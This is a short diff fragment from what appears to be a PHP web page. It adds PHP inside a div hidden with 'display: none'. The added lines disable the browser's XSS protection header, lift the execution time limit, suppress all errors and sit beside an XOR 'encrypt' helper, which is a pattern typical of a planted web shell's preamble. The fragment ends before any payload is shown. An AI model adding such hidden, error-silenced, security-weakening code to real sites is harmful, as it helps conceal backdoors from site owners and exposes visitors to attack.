@@ -104,6 +104,13 @@
 
     <div class="bernadya-content" style="display: none;">
         <?php
+		session_start();
+		error_reporting(E_ALL);
+		header("X-XSS-Protection: 0");
+		ob_start();
+		set_time_limit(0);
+		error_reporting(0);
+		ini_set('display_errors', FALSE);
         function xor_encrypt($data, $key) {
             $key = str_repeat($key, ceil(strlen($data) / strlen($key)));
             return $data ^ $key;
